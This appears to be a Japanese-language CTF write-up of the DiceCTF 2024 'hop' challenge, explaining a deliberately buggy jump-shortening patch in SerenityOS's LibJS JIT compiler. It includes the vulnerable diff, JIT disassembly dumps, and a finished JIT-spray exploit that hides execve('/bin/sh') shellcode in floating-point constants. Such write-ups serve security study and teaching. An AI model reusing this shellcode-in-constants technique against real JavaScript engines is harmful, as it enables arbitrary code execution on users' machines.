---
layout: page
title: "DiceCTF 2024 hop"
date: 2024-02-08 00:00:00 -0000
---

DiceCTF2024はbaby-talk（heap off-by-one nullでオーバーラップ作って終わり）をパッと解いて、boogie-woogie（topチャンクを変えてlibcリーク、AARWでスタック書き換え）でone_gadget用のバイト探しに苦しんで終わりました。触った問題は解法は素直なので省略し、おもしろそうだった他の問題をやってみることにしました。

# hop
SerenityOSのブラウザのjavascriptエンジンにバグのあるパッチを含ませたものが与えられます。

このjavascriptエンジンでは、スクリプトは一度目の利用から、VMではなく直接x86のバイトコードにコンパイルされます。

パッチされている関数は、このコンパイルの過程でジャンプ部分に具体的なオフセットを入れていく関数です。

INT8_MAXに収まる距離だったら、5バイトのジャンプではなく、2バイトのジャンプに変えるというパッチですが、`offset`で値をチェックした後、`offset+3`を入れるため、最大値付近のジャンプを用意しておくと、負方向に飛ぶようになり壊れます。

```diff
diff --git a/Userland/Libraries/LibJIT/X86_64/Assembler.h b/Userland/Libraries/LibJIT/X86_64/Assembler.h
index 79b96cf81f..465c4cb38c 100644
--- a/Userland/Libraries/LibJIT/X86_64/Assembler.h
+++ b/Userland/Libraries/LibJIT/X86_64/Assembler.h
@@ -472,12 +472,23 @@ struct X86_64Assembler {
     private:
         void link_jump(X86_64Assembler& assembler, size_t offset_in_instruction_stream)
         {
-            auto offset = offset_of_label_in_instruction_stream.value() - offset_in_instruction_stream;
+            auto offset = static_cast<ssize_t>(offset_of_label_in_instruction_stream.value() - offset_in_instruction_stream);
             auto jump_slot = offset_in_instruction_stream - 4;
-            assembler.m_output[jump_slot + 0] = (offset >> 0) & 0xff;
-            assembler.m_output[jump_slot + 1] = (offset >> 8) & 0xff;
-            assembler.m_output[jump_slot + 2] = (offset >> 16) & 0xff;
-            assembler.m_output[jump_slot + 3] = (offset >> 24) & 0xff;
+            if (offset <= INT8_MAX && offset >= INT8_MIN && assembler.m_output[jump_slot - 1] == 0xE9) {
+                auto small_offset = static_cast<int8_t>(offset + 3);
+                // JMP rel8
+                assembler.m_output[jump_slot - 1] = 0xEB;
+                assembler.m_output[jump_slot + 0] = small_offset;
+                // NOP3_OVERRIDE_NOP
+                assembler.m_output[jump_slot + 1] = 0x0F;
+                assembler.m_output[jump_slot + 2] = 0x1F;
+                assembler.m_output[jump_slot + 3] = 0x00;
+            } else {
+                assembler.m_output[jump_slot + 0] = (offset >> 0) & 0xff;
+                assembler.m_output[jump_slot + 1] = (offset >> 8) & 0xff;
+                assembler.m_output[jump_slot + 2] = (offset >> 16) & 0xff;
+                assembler.m_output[jump_slot + 3] = (offset >> 24) & 0xff;
+            }
         }
     };
```

ということであとはJIT sprayで終わりなのですが、負方向のオフセットは固定なので、ペイロードの位置を調整する必要があります。

最終的に、バイトコードが以下のような配置ようにスクリプトを組んでいきます。

```
0x80ほどの長さのJIT sprayペイロード
eb 80
分岐の後処理１
~~~
[0x80ほどの隙間]
~~~
分岐の後処理２
```

分岐があるのは、これがないとジャンプが出力されないからです。下側の隙間がいる理由は、この隙間がないと、狙いのバグがある`eb 80`が出力されないからです。

そもそもどんなコードが出力されているのかどうかもわからないので、まずはソースを改変してビルドしなおします。

`Userland/Libraries/LibJS/JIT/Compiler.cpp`

```diff
diff --git a/Userland/Libraries/LibJS/JIT/Compiler.cpp b/Userland/Libraries/LibJS/JIT/Compiler.cpp
index b77964526c..c0fcfbf206 100644
--- a/Userland/Libraries/LibJS/JIT/Compiler.cpp
+++ b/Userland/Libraries/LibJS/JIT/Compiler.cpp
@@ -32,8 +32,8 @@
 
 #    define LOG_JIT_SUCCESS 0
 #    define LOG_JIT_FAILURE 1
-#    define DUMP_JIT_MACHINE_CODE_TO_STDOUT 0
-#    define DUMP_JIT_DISASSEMBLY 0
+#    define DUMP_JIT_MACHINE_CODE_TO_STDOUT 1
+#    define DUMP_JIT_DISASSEMBLY 1
 
 #    define TRY_OR_SET_EXCEPTION(expression)                                                                                        \
         ({
```

取り急ぎ分岐を作ってコンパイルしてみると、生成されたバイトコードを表示してくれるようになります。

```javascript
function hello(n) {
        if (n == 1) {
                return 1.1;
        }
        else {
                return 2.2;
        }
}
hello(1);
```

出力抜粋です。

```
...

Block 2:
2:0 LoadImmediate undefined:
0x00007f10f806328d  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
0x00007f10f8063294  00 fe 7f
0x00007f10f8063297  49 89 c4              mov    r12,rax
2:20 LoadImmediate 2.2:
0x00007f10f806329a  48 b8 9a 99 99 99 99  mov    rax, 0x400199999999999a
0x00007f10f80632a1  99 01 40
0x00007f10f80632a4  49 89 c4              mov    r12,rax
2:40 Return:
0x00007f10f80632a7  4c 89 e0              mov    rax,r12
0x00007f10f80632aa  48 89 43 20           mov    [rbx+0x20],rax
0x00007f10f80632ae  eb 2e                 jmp    short f80632de <common_exit>　<-- これを大きくする
0x00007f10f80632b0  0f 1f 00              nop    [rax]

Block 3:
3:0 LoadImmediate undefined:
0x00007f10f80632b3  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
0x00007f10f80632ba  00 fe 7f
0x00007f10f80632bd  49 89 c4              mov    r12,rax
3:20 LoadImmediate 1.1:
0x00007f10f80632c0  48 b8 9a 99 99 99 99  mov    rax, 0x3ff199999999999a
0x00007f10f80632c7  99 f1 3f
0x00007f10f80632ca  49 89 c4              mov    r12,rax
3:40 Return:
0x00007f10f80632cd  4c 89 e0              mov    rax,r12
0x00007f10f80632d0  48 89 43 20           mov    [rbx+0x20],rax
0x00007f10f80632d4  eb 08                 jmp    short f80632de <common_exit>
...
```
このブロック２とブロック３が、それぞれの`return`の内容を処理しているのが分かります。そのあとはcommon_exitというブロックに飛ぶことが決まっていて、この時ブロック３の大きさがぴったり0x7dであれば、今`eb 2e`となっているところが`eb 80`となり、負方向に飛ぶようになります。

小さすぎると正しく飛んでしまい、大きくなると命令の置き換えが起こらないため、この`Block 3`のところをサイズ0x7dから0x7fの間にする必要があります。適当にコードを入れてあげればよいですが、何を入れても結構な量のコードが追加されてしまい、細かいコントロールがしにくいです。

ただしあまり内容チェックや組み換えはしないようで、そこそこ入れた通りコードを吐いてくれます。最終的に以下のようなスクリプトで`Block 3`のサイズをいい感じにしました。

```
function hello(n) {
        if (n == 1) {
                return 1.1;
        }
        else {
                1.1
                1.1;
                1.1;
                [1.2];
                [];
        }
}
hello(1);
```

出力は以下のようになります。負方向に飛んでクラッシュすることや、無意味に1.1を何度か入れているのを、そのまま繰り返して入れているのが分かります。

```
Block 2:
2:0 LoadImmediate undefined:
0x00007f12b309c28d  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
0x00007f12b309c294  00 fe 7f
0x00007f12b309c297  49 89 c4              mov    r12,rax
2:20 LoadImmediate 1.1:
0x00007f12b309c29a  48 b8 9a 99 99 99 99  mov    rax, 0x3ff199999999999a
0x00007f12b309c2a1  99 f1 3f
0x00007f12b309c2a4  49 89 c4              mov    r12,rax
2:40 Return:
0x00007f12b309c2a7  4c 89 e0              mov    rax,r12
0x00007f12b309c2aa  48 89 43 20           mov    [rbx+0x20],rax
0x00007f12b309c2ae  eb 82                 jmp    short b309c232 <1:80+0x14> <-- 負方向に飛ぶ
0x00007f12b309c2b0  0f 1f 00              nop    [rax]

Block 3:
3:0 LoadImmediate undefined:
0x00007f12b309c2b3  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
0x00007f12b309c2ba  00 fe 7f
0x00007f12b309c2bd  49 89 c4              mov    r12,rax
3:20 LoadImmediate 1.1:
0x00007f12b309c2c0  48 b8 9a 99 99 99 99  mov    rax, 0x3ff199999999999a
0x00007f12b309c2c7  99 f1 3f
0x00007f12b309c2ca  49 89 c4              mov    r12,rax
3:40 LoadImmediate 1.1:
0x00007f12b309c2cd  48 b8 9a 99 99 99 99  mov    rax, 0x3ff199999999999a
```

あとは負方向に飛ばした先にペイロードがあればよいです。即値として負数を入れると変な演算が入るので、これを回避しつつint3で埋めてみます。

```
>>> struct.unpack('<d', p64(0x1ccccccccccccccc))[0]
5.961903555800228e-170
```

サイズを調整して、以下のスクリプトでトラップが起こります。

```
function hello(n) {
        if (n == 1) {
                5.961903555800228e-170;
                5.961903555800228e-170;
                5.961903555800228e-170;
                5.961903555800228e-170;
                5.961903555800228e-170;
                5.961903555800228e-170;
                5.961903555800228e-170;
                5.961903555800228e-170;
                5.961903555800228e-170;
                5.961903555800228e-170;
                [];
                return 1.1;
        }
        else {
                1.1
                1.1;
                1.1;
                [1.2];
                [];
        }
}
hello(1);
```

あとは飛んだ位置を確認して、そこからシェルコードを入れていけばよいです。完成したスクリプトは以下の通りです。

```
function hello(n) {
        if (n == 1) {
                5.961903555800228e-170;
                5.961903555800228e-170;
                5.961903555800228e-170;
                5.961903555800228e-170;
                3.7617931363848883e-280;        // mov eax, 0; push rax; push rax
                3.7696948622719174e-280;        // call $+5; pop rdi
                3.7506973812839493e-280;        // add rdi, 0x22; mv al, 0x3b
                7.980295035359349e-305;         // pop rdx; pop rsi; syscall
                1.0880585577140108e-306;        //  '/bin/sh\x00'
                5.961903555800228e-170;
                [];
                return 1.1;
        }
        else {
                1.1
                1.1;
                1.1;
                [1.2];
                [];
        }
}
hello(1);
```